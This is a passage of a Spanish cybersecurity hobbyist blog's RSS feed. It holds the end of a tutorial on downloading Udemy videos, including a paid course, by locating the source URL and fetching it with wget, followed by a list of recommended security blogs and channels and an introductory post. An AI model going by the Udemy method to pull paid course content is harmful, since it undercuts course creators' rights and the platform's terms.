+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/source.png&quot; alt=&quot;source&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Genial obtuvimos la URL absoluta del video, procedemos a abrir el video en una nueva pestaña.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/tenemoselvideo.png&quot; alt=&quot;video&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora a copiar la URL y descargar a través de wget.
+&lt;img src=&quot;/images/Images-Post-downloadudemy/wgeturl.png&quot; alt=&quot;wget&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Validamos que realmente se trata de un fichero MP4.
+&lt;img src=&quot;/images/Images-Post-downloadudemy/videodescargado.png&quot; alt=&quot;video&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aquí cambio el nombre y habilito un servidor HTTP por el puerto 8080 para visualizar el video de una manera más cómoda.
+&lt;img src=&quot;/images/Images-Post-downloadudemy/vervideo.png&quot; alt=&quot;http&quot; /&gt;
+&lt;img src=&quot;/images/Images-Post-downloadudemy/viendoelvideo.png&quot; alt=&quot;viendo el video&quot; /&gt;
+Listo hemos descargado una clase del curso, ahora debemos repetir los pasos.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Ahora mostraré que con un curso de &lt;a href=&quot;https://www.udemy.com/course/curso-de-metasploit-framework/&quot;&gt;pago&lt;/a&gt; se puede hacer.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-downloadudemy/cursodepago.png&quot; alt=&quot;curso de pago&quot; /&gt;
+Genial.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;Fin&lt;/h1&gt;
+&lt;p&gt;Este ha sido el tutorial de hoy bastante simple, el método, pero efectivo, no he visto este método para descargar los videos, aunque de seguro alguien lo sabe.&lt;/p&gt;
+
+&lt;p&gt;Espero te haya gustado, recuerda que más abajo están las reacciones y puedes dejar un comentario.&lt;br /&gt;
+También puedes comunicarte a través de las siguientes vías;&lt;br /&gt;
+&lt;a href=&quot;https://twitter.com/T3_6_9&quot;&gt;Twitter&lt;/a&gt;, &lt;a href=&quot;https://t.me/T3_6_9&quot;&gt;Telegram&lt;/a&gt;, &lt;a href=&quot;mailto:t3sla@t3sla.tk&quot;&gt;E-mail&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Agregar que si quieres realizar alguna donación lo puedes hacer a través del siguiente botón:
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js&quot; data-name=&quot;bmc-button&quot; data-slug=&quot;T3sla&quot; data-color=&quot;#BD5FFF&quot; data-emoji=&quot;🍕&quot; data-font=&quot;Lato&quot; data-text=&quot;Buy me a pizza&quot; data-outline-color=&quot;#000000&quot; data-font-color=&quot;#ffffff&quot; data-coffee-color=&quot;#FFDD00&quot;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Y obtén “beneficios”.&lt;/p&gt;
+</description>
+                <pubDate>Sat, 29 Oct 2022 21:59:00 -0300</pubDate>
+                <link>/descargar-videos-de-udemy</link>
+                <guid isPermaLink="true">/descargar-videos-de-udemy</guid>
+                
+                <category>Tutorial</category>
+                
+                <category>T3sla</category>
+                
+                <category>2022</category>
+                
+                
+                <category>Tutorial</category>
+                
+            </item>
+        
+            <item>
+                <title>Recursos de Ciberseguridad</title>
+                <description>&lt;p&gt;Bienvenidos, este artículo es el primero de la serie que estoy pensando en hacer constara de compartir los mejores canales, apuntes, blogs, etc.; 
+relacionados con ciberseguridad.&lt;/p&gt;
+
+&lt;p&gt;Ninguno de los creadores de contenido que compartiré están ordenados de mejor a peor, todos tienen contenido de calidad y sus creadores sé esfuerzan.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;thehackerway&quot;&gt;&lt;a href=&quot;https://thehackerway.com/&quot;&gt;TheHackerWay&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Quizás muchos conocen este blog.&lt;/li&gt;
+  &lt;li&gt;Cuenta con bastante post, para leer.&lt;/li&gt;
+  &lt;li&gt;En este blog encontrarás diferentes técnicas de Hacking. &lt;br /&gt;
+Desde Post explotación en sistemas operativos (SO) Windows y GNU/LINUX, diferentes- herramientas para Red Team y mucho más.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/Thehackerway.png&quot; alt=&quot;Thehacerway&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;
+¿Quién es el autor?&lt;br /&gt; &lt;a href=&quot;https://www.instagram.com/debiadastra/&quot;&gt;Daniel Echeverri (adastra).&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;s4vitar&quot;&gt;&lt;a href=&quot;https://www.youtube.com/channel/UCNHWpNqiM8yOQcHXtsluD7Q&quot;&gt;S4vitar&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Muchos conocerán este canal.&lt;/li&gt;
+  &lt;li&gt;Encontrarás desde: 
+noticias de ciberseguridad, consejos, writeups de máquinas de plataformas como HackTheBox, scripting en Bash y mucho más.&lt;/li&gt;
+  &lt;li&gt;Demasiados videos para ver, disfruta. 😊&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/s4vitar.png&quot; alt=&quot;s4vitar&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;También s4vitar, cuenta con un blog donde sube artículos interesantes.&lt;br /&gt;
+Dale un vistazo ≥ &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;s4vitar-blog&lt;/a&gt;.&lt;/p&gt;
+  &lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/s4vitar-blog.png&quot; alt=&quot;s4vitar Blog&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;víctor-garcía-takito1812&quot;&gt;&lt;a href=&quot;https://www.youtube.com/c/takito1812/featured&quot;&gt;Víctor García&lt;/a&gt; (takito1812)&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Siento que este canal, debería ser más conocido, ya que su contenido es bueno, explica bastante bien y se nota el esfuerzo que hay detrás.&lt;/li&gt;
+  &lt;li&gt;Encontrarás, desde Writeups de máquinas de plataformas como &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackThebox&lt;/a&gt;, &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt;. Una, guía de preparación para la certificación &lt;strong&gt;OSCP&lt;/strong&gt; de &lt;a href=&quot;https://www.offensive-security.com/&quot;&gt;Offensive Security&lt;/a&gt;.&lt;/li&gt;
+  &lt;li&gt;Takito es una persona que admiro mucho y se nota que pilota del tema.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/takito.png&quot; alt=&quot;takito&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;También cuenta con un &lt;a href=&quot;https://cybexsec.es/&quot; title=&quot;cybex-blog&quot;&gt;blog&lt;/a&gt; y &lt;a href=&quot;https://discord.com/invite/WeS2Epy&quot; title=&quot;CybexSec-Discord&quot;&gt;comunidad&lt;/a&gt;, la cual es CybexSec.&lt;/p&gt;
+  &lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/Images-Post-recursosciber/cybex-blog.png&quot; alt=&quot;CybexSec&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;securiters&quot;&gt;&lt;a href=&quot;https://www.youtube.com/c/Securiters/featured&quot;&gt;Securiters&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Comenzaron, hace relativamente poco.&lt;/li&gt;
+  &lt;li&gt;Encontrarás, desde Entrevistas, Resoluciones de máquinas de plataformas como HackTheBox, TryHackMe, diferentes paths de aprendizaje y mucho más.&lt;/li&gt;
+  &lt;li&gt;Buenos videos para ver 😊.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/Securiters.png&quot; alt=&quot;Securiters&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size: 12px;&quot;&gt;Se conforma por:&lt;br /&gt;&lt;a href=&quot;https://twitter.com/martrudix&quot;&gt;Marta&lt;/a&gt; y &lt;a href=&quot;https://twitter.com/Carol12Gory&quot;&gt;Carol&lt;/a&gt;&lt;br /&gt;Securiters, es más de usar &lt;a href=&quot;https://www.twitch.tv/securiters&quot;&gt;Twitch.&lt;/a&gt;&lt;br /&gt;Securiters, también cuenta con un &lt;a href=&quot;https://bitsdeciberseguridad.substack.com/&quot;&gt;Blog&lt;/a&gt;.&lt;/p&gt;
+  &lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/Securiters-Blog.png&quot; alt=&quot;Blog Securiters&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;cronup&quot;&gt;&lt;a href=&quot;https://www.cronup.com/blog/&quot;&gt;CronUP&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Demasiados posts, para leer (Claro, yo no me he leído todo 😁).&lt;/li&gt;
+  &lt;li&gt;Los artículos que he leído, son bastante detallados y bien explicados. Claro no tan técnicos, para que personas que no están tan metidos en este mundo, sea fácil dé entender (algunos mas que otros).&lt;/li&gt;
+  &lt;li&gt;Encontrarás, investigaciones sobre malware, noticias y más.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/CronUp.png&quot; alt=&quot;CronUP&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;CronUP, es una empresa de Ciberseguridad Chilena.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;deephacking&quot;&gt;&lt;a href=&quot;https://deephacking.com/&quot;&gt;DeepHacking&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Unos artículos guapísimos.&lt;/li&gt;
+  &lt;li&gt;Encontrarás, desde explicaciones detalladas sobre vulnerabilidades en aplicaciones web como SQLI (SQL injection). Writeups de laboratorios de PortSwigger, reviews de- certificaciones y más.&lt;/li&gt;
+  &lt;li&gt;Muy bueno este blog 😊.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/DeepHacking.png&quot; alt=&quot;DeepHacking&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;¿Quién es el autor?&lt;br /&gt;&lt;a href=&quot;https://twitter.com/sikumy&quot;&gt;Sikumy&lt;/a&gt;.&lt;br /&gt;También tiene estos fabulosos apuntes, dale una vuelta ≥ &lt;a href=&quot;https://www.notion.so/Hacking-Notes-40b8125e2c344f8482897fe9d7259935&quot;&gt;Hacking Notes&lt;/a&gt;.&lt;/p&gt;
+  &lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/Sikumy-HackingNotes.png&quot; alt=&quot;Hacking Notes&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;sha-16&quot;&gt;&lt;a href=&quot;https://www.youtube.com/c/sha16&quot;&gt;Sha-16&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Encontrarás, desde Writeups de máquinas de plataformas como HackThebox y TryHackMe. Review de la certificación eJPT, diferentes tutoriales, explica técnicas y más.&lt;/li&gt;
+  &lt;li&gt;Síguelo en -&amp;gt; &lt;a href=&quot;https://www.twitch.tv/sha_16_&quot;&gt;Twitch&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Descubrí su canal, hace un tiempo y me gusto su contenido. 😁&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/sha-16.png&quot; alt=&quot;sha16&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;También cuenta con un &lt;a href=&quot;https://sha-16.github.io/&quot;&gt;Blog&lt;/a&gt;.&lt;/p&gt;
+  &lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/sha-16blog.png&quot; alt=&quot;Sha16 Blog&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;s1kr10s&quot;&gt;&lt;a href=&quot;https://www.youtube.com/user/dthhack&quot;&gt;s1kr10s&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Encontrarás, desde vulnerabilidades que ha encontrado, Writeups de retos de reversing y más.&lt;/li&gt;
+  &lt;li&gt;s1kr10s, es alguien que admiro demasiado y lo encuentro muy pro.&lt;/li&gt;
+  &lt;li&gt;Para los que le gusta el reversing y entender las cosas a bajo nivel.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/s1kr10s.png&quot; alt=&quot;s1kr10s&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;También, tiene un &lt;a href=&quot;https://s1kr10s.github.io/&quot;&gt;blog&lt;/a&gt;, con muy buen contenido.&lt;/p&gt;
+  &lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/s1kr10s-blog.png&quot; alt=&quot;blog&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;mario-guglia&quot;&gt;&lt;a href=&quot;https://guglia001.github.io/&quot;&gt;Mario Guglia&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Encontrarás, desde Writeups de máquinas de plataformas como HackTheBox y TryHackMe. AD (Active Directory) y mucho más.&lt;/li&gt;
+  &lt;li&gt;He tenido el placer de hablar con él, me ha ayudado y no dudará en echarte un cable.&lt;/li&gt;
+  &lt;li&gt;Es alguien que controla mucho del tema.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/guglia.png&quot; alt=&quot;mario blog&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;🔥💣.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;jotinero&quot;&gt;&lt;a href=&quot;https://www.youtube.com/channel/UCW0lXMtKpBHI_OeGHzz8ONQ/videos&quot;&gt;Jotinero&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Un buen canal. 😊&lt;/li&gt;
+  &lt;li&gt;Encontrarás, desde OSINT, ataques a redes inalámbricas, consejos y más.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/joti.png&quot; alt=&quot;jotinero canal&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Disfruten. 😊&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;paulo-colomés&quot;&gt;&lt;a href=&quot;https://www.youtube.com/c/pcolomes/videos&quot;&gt;Paulo Colomés&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Encontrarás, desde un curso donde enseña algunas técnicas de hacking a redes LAN, configuraciones, conceptos de networking y más.&lt;/li&gt;
+  &lt;li&gt;Sin duda un gran profesional y explica demasiado bien.&lt;/li&gt;
+  &lt;li&gt;Perfecto para los que le gusta networking, ¡Que esperas!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/paulo.png&quot; alt=&quot;paulo&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;También cuenta con un &lt;a href=&quot;https://netlayer.cl/&quot;&gt;blog&lt;/a&gt; con un fantástico contenido.&lt;/p&gt;
+  &lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/netlayer.png&quot; alt=&quot;netlayer&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;ironhackers&quot;&gt;&lt;a href=&quot;https://ironhackers.es/&quot;&gt;IronHackers&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Encontrarás, desde Writeups de plataformas como HackTheBox, Atenea, Vulnhub. Tutoriales, notas y más.&lt;/li&gt;
+  &lt;li&gt;Entra, que te gustara.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/ironhackers.png&quot; alt=&quot;IronHackers Image&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;También, tienen canal de &lt;a href=&quot;https://www.youtube.com/channel/UCS76vOfm7dsfp91wIgh_X7w/videos&quot;&gt;YouTube&lt;/a&gt;.&lt;/p&gt;
+  &lt;p&gt;&lt;img src=&quot;/images/Images-Post-recursosciber/ironhackers-canal.png&quot; alt=&quot;canal IronHackers&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;Fin&lt;/h1&gt;
+&lt;p&gt;Este ha sido el artículo de hoy, espero te haya gustado.&lt;/p&gt;
+
+&lt;p&gt;Cualquier error lo pueden comunicar a través de las siguientes vías, de igual manera la retroalimentación (Más abajo pueden reaccionar y comentar.);
+&lt;br /&gt;
+&lt;a href=&quot;https://twitter.com/T3_6_9&quot;&gt;Twitter&lt;/a&gt;, &lt;a href=&quot;https://t.me/T3_6_9&quot;&gt;Telegram&lt;/a&gt;.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si deseas apoyarme de manera económica te dejo el siguiente enlace.
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js&quot; data-name=&quot;bmc-button&quot; data-slug=&quot;T3sla&quot; data-color=&quot;#BD5FFF&quot; data-emoji=&quot;🍕&quot; data-font=&quot;Lato&quot; data-text=&quot;Buy me a pizza&quot; data-outline-color=&quot;#000000&quot; data-font-color=&quot;#ffffff&quot; data-coffee-color=&quot;#FFDD00&quot;&gt;&lt;/script&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+                <pubDate>Sat, 29 Oct 2022 03:21:00 -0300</pubDate>
+                <link>/recursos-de-ciberseguridad</link>
+                <guid isPermaLink="true">/recursos-de-ciberseguridad</guid>
+                
+                <category>Ciberseguridad</category>
+                
+                <category>2022</category>
+                
+                <category>T3sla</category>
+                
+                
+                <category>Ciberseguridad</category>
+                
+            </item>
+        
+            <item>
+                <title>Hola Mundo</title>
+                <description>&lt;p&gt;Bienvenidos en el artículo de hoy, daré un poco de contexto sobre este blog.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;qué-encontrarás-en-este-blog&quot;&gt;¿Qué encontrarás en este blog?&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;Hacking.&lt;/li&gt;
+  &lt;li&gt;Writeups de diferentes plataformas de ciberseguridad.&lt;/li&gt;
+  &lt;li&gt;Programación.&lt;/li&gt;
+  &lt;li&gt;Tutoriales.&lt;/li&gt;
+  &lt;li&gt;Recursos/apuntes.&lt;/li&gt;
+  &lt;li&gt;F1 (Formula uno).&lt;/li&gt;
+  &lt;li&gt;Videojuegos.&lt;/li&gt;
+  &lt;li&gt;Anime.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;qué-me-dio-por-crear-un-blog&quot;&gt;¿Qué me dio por crear un blog?&lt;/h3&gt;
+&lt;p&gt;La verdad tengo unas ganas enormes de crear contenido y darme de “cierta” forma a conocer. Además, siento que &lt;strong&gt;escribiendo&lt;/strong&gt; reforzaré mis &lt;strong&gt;conocimientos&lt;/strong&gt; y &lt;strong&gt;aprenderé&lt;/strong&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:15px;&quot;&gt;No soy ningún experto, solo un entusiasta que busca tratar de crear contenido, aprender y mejorar, para algún día llegar a trabajar como un Pentester o Programador. Cualquier feedback es bienvenido usted es libre de expresarse como quiera.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;fin&quot;&gt;Fin&lt;/h2&gt;
+&lt;p&gt;Este ha sido el artículo de hoy, espero disfrutes del contenido que hago y aprendas algo nuevo.
+Saludos, nos vemos en el próximo artículo.&lt;/p&gt;
+</description>
+                <pubDate>Fri, 28 Oct 2022 23:21:00 -0300</pubDate>
+                <link>/hola-mundo</link>
+                <guid isPermaLink="true">/hola-mundo</guid>
+                
+                <category>HolaMundo</category>
+                
+                <category>2022</category>
+                
+                <category>T3sla</category>
+                
+                <category>Noob</category>
+                
+                
+                <category>Bienvenida</category>
+                
+            </item>
+        
+    </channel>
+</rss>
